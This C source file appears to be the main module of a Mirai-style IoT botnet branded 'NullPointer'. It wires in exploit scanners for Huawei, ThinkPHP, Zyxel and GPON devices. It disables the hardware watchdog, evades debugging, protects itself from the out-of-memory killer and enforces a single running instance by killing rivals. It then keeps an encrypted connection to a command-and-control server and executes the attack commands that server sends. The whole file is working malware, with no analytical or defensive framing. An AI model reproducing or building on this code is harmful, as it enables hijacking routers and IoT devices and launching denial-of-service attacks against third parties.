#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "resolv.h"
#include "killer.h"
#ifdef NP_TELNET
#include "scanner.h"
#include "exploit_scanner.h"
#include "huawei.h"
#include "thinkphp.h"
#include "zyxel_scanner.h"
#include "gpon80_scanner.h"
#include "gpon8080_scanner.h"
#endif
#include "util.h"
#include "util_userns.h"
#include "proto.h"
#include "antidebug.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);


#ifndef NP_INSTANCE_PORT
#define NP_INSTANCE_PORT 13324
#endif
#define SINGLE_INSTANCE_PORT (NP_INSTANCE_PORT)

ipv4_t LOCAL_ADDR;
struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, watchdog_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

#ifdef DEBUG
    static void segv_handler(int sig, siginfo_t *si, void *unused)
    {
        printf("[NullPointer] >> got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
        exit(EXIT_FAILURE);
    }
#endif 
int main(int argc, char **args)
{
    char name_buf[32], id_buf[32];
    int name_buf_len = 0, pgid = 0, pings = 0;

    #ifndef DEBUG
        sigset_t sigs;
        int wfd;

        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, &anti_gdb_entry);

        if ((wfd = open("/dev/watchdog", 2)) != -1 ||
            (wfd = open("/dev/misc/watchdog", 2)) != -1)
        {
            int one = 1;
            ioctl(wfd, 0x80045704, &one);
            close(wfd);
        }
        chdir("/");
    #endif

    #ifdef DEBUG
        printf("[dbg] debug the debug\n");

        sleep(1);
    #endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();

    anti_gdb_entry(0);
    anti_debug_check();

    util_privilege_try(argc, args);

    ensure_single_instance();

    rand_init();

    util_zero(id_buf, 32);
    if(argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    attack_init();
    killer_init();
    #ifdef NP_TELNET
    #endif

    resolve_func = resolve_cnc_addr;
    resolve_cnc_addr();

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    sleep(10);

    {
        int oom_fd = open("/proc/self/oom_score_adj", O_WRONLY);
        if (oom_fd >= 0) {
            const char oom_val[] = "-1000";
            write(oom_fd, oom_val, sizeof(oom_val) - 1);
            close(oom_fd);
        }
    }

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        if (fd_serv == -1)
            establish_connection();

        if (fd_serv >= 0) {
            if (pending_connection)
                FD_SET(fd_serv, &fdsetwr);
            else
                FD_SET(fd_serv, &fdsetrd);
        }

        mfd = (fd_ctrl > fd_serv) ? fd_ctrl : fd_serv;
        if (mfd < 0)
            mfd = 0;

        timeo.tv_usec = 0;
        timeo.tv_sec = (fd_serv == -1 || pending_connection) ? 15 : 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        if (nfds > 0 && fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG
            printf("[main] Detected newer instance running! Killing self\n");
#endif
#ifdef NP_TELNET
            scanner_kill();
            exploit_scanner_kill();
            huawei_kill();
            thinkphp_kill();
            zyxel_scanner_kill();
            gpon80_scanner_kill();
            gpon8080_scanner_kill();
#endif
            killer_kill();
            attack_kill_all();
            kill(pgid * -1, 9);
            exit(0);
        }
        if (nfds == 0 && fd_serv >= 0 && !pending_connection)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0) {
                if (send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL) <= 0)
                    teardown_connection();
            }
        }

        if(pending_connection)
        {
            pending_connection = FALSE;

            if(!FD_ISSET(fd_serv, &fdsetwr))
            {
                #ifdef DEBUG
                    printf("[main] timed out while connecting to CNC\n");
                #endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err != 0)
                {
                    #ifdef DEBUG
                        printf("[main] error while connecting to CNC code=%d\n", err);
                    #endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 3) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);
                    uint8_t hs[256];
                    int hs_len = 4 + id_len;

                    LOCAL_ADDR = util_local_addr();
                    hs[0] = (PROTO_MAGIC_BOT >> 8) & 0xFF;
                    hs[1] = PROTO_MAGIC_BOT & 0xFF;
                    hs[2] = 1;
                    hs[3] = id_len;
                    if (id_len > 0)
                        util_memcpy(hs + 4, id_buf, id_len);
                    proto_encrypt(hs, hs_len);
                    send(fd_serv, hs, hs_len, MSG_NOSIGNAL);

                    #ifdef DEBUG
                        printf("[main] connected to CNC.\n");
                    #endif
                }
            }
        }
        else if(fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 1\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            if(len == 0)
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
                continue;
            }
            len = ntohs(len);
            if(len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 2\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

            if (n > 0) {
                proto_decrypt((uint8_t *)rdbuf, n);
                attack_parse(rdbuf, n);
            }
            #ifdef DEBUG
                printf("[main] received %d bytes from CNC\n", n);
            #endif
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    #ifndef USEDOMAIN
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_addr.s_addr = SERVIP;
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
    #else
    struct resolv_entries *entries;
    entries = resolv_lookup(SERVDOM);
    if (entries == NULL)
    {
        srv_addr.sin_addr.s_addr = SERVIP;
        return;
    } else {
        srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    }
    
    resolv_entries_free(entries);
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
    #endif
}

static void establish_connection(void)
{
    #ifdef DEBUG
        printf("[main] attempting to connect to CNC\n");
    #endif

    if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[main] failed to call socket(). Errno = %d\n", errno);
        #endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if(resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
    #ifdef DEBUG
        printf("[main] tearing down connection to CNC!\n");
    #endif

    if(fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
}
static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    static int retry_count = 0;
    struct sockaddr_in addr;
    int opt = 1;

    if (retry_count++ > 48) {
        retry_count = 0;
        fd_ctrl = -1;
        return;
    }

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind) {
            local_bind = FALSE;
            addr.sin_addr.s_addr = INADDR_ANY;
            if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == 0)
                goto listen_ok;
        }
        if (errno != EADDRINUSE) {
#ifdef DEBUG
            printf("[main] bind errno=%d, retry %d\n", errno, retry_count);
#endif
        }
#ifdef DEBUG
        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
#endif

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[main] Failed to connect to fd_ctrl to request process termination\n");
#endif
        }
        
        sleep(5);
        close(fd_ctrl);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance();
        return;
    }
listen_ok:
    if (listen(fd_ctrl, 1) == -1)
    {
#ifdef DEBUG
        printf("[main] Failed to call listen() on fd_ctrl\n");
#endif
        close(fd_ctrl);
        sleep(5);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance();
        return;
    }
    retry_count = 0;
#ifdef DEBUG
    printf("[main] We are the only process on this system!\n");
#endif
}


